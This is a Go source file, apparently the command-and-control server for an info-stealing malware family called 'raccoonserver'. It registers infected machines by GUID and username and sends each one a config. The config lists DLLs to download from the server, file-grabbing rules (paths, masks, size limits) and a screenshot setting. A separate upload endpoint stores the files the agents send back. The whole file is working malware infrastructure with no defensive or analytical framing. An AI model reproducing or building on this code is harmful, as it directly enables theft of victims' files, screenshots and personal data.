package controllers

import (
	"fmt"
	"log"
	"net/http"
	"raccoonserver/configs"
	"raccoonserver/database"
	"raccoonserver/models"
	"strconv"
	"strings"

	"github.com/gin-gonic/gin"
)

type AgentController struct {
	config *configs.ServerConfig
}

func NewAgentController() *AgentController {
	config, _ := configs.LoadServerConfig()
	return &AgentController{
		config: config,
	}
}

// RegisterAgent is the handler function for POST / endpoint
// Validation happens at the middleware level, not here!
func (ctrl *AgentController) RegisterAgent(c *gin.Context) {
	// Read in request from the context.
	request := c.MustGet("request").(models.PostRequestRegistration)

	// Build new agent
	var agent models.Agent
	parts := strings.Split(request.MachineId, "|")
	agent.MachineGuid = parts[0]            // "machineGuid"
	agent.Username = parts[1]               // "username"
	request.ConfigID = ctrl.config.ConfigID // configID

	// Insert new agent in the DB
	// The InsertAgent methond also generates a unique token for the agent.
	err := database.InsertAgent(&agent)
	if err != nil {
		log.Fatal(err)
	}

	// Send AgentConfig
	c.String(http.StatusOK, ctrl.buildAgentConfig(&agent))
}

func (ctrl *AgentController) buildAgentConfig(agent *models.Agent) string {
	var agentConfig string

	// Libs
	for _, lib := range ctrl.config.Libs {
		agentConfig += "libs_" + lib + ":" + ctrl.config.HostAddr + "/" + agent.Token + "/" + lib + ".dll"
		agentConfig += "\n"
	}

	// Grabbers
	for _, grbr := range ctrl.config.Grbrs {
		agentConfig += "grbr_" + grbr.Name + ":" + grbr.Path + "|" + grbr.Mask + "|" + grbr.Exceptions + "|" + strconv.Itoa(grbr.SizeLimit) + "|" + strconv.Itoa(grbr.Subfolders) + "|" + strconv.Itoa(grbr.Shortcuts)
		agentConfig += "\n"
	}

	// Screenshot
	agentConfig += "scrnsht_Screenshot.jpeg:" + strconv.Itoa(ctrl.config.Scrnsht)
	agentConfig += "\n"

	// Token
	agentConfig += "token:" + agent.Token
	agentConfig += "\n"

	return agentConfig
}

func (ctrl *AgentController) RecieveFile(c *gin.Context) {
	err := c.Request.ParseMultipartForm(0)
	if err != nil {
		c.AbortWithStatus(http.StatusNoContent)
		return
	}

	// Get the uploaded file
	file, err := c.FormFile("file")
	token := c.Param("token")

	// The file cannot be received.
	if err != nil {
		fmt.Println("Can't read multipart form file")
		c.AbortWithStatus(http.StatusNoContent)
		return
	}

	if err := database.StoreFile(token, file); err != nil {
		fmt.Println("Can't save file: " + err.Error())
		c.AbortWithStatus(http.StatusNoContent)
		return
	} else {
		c.String(http.StatusOK, "recieved")
	}
}
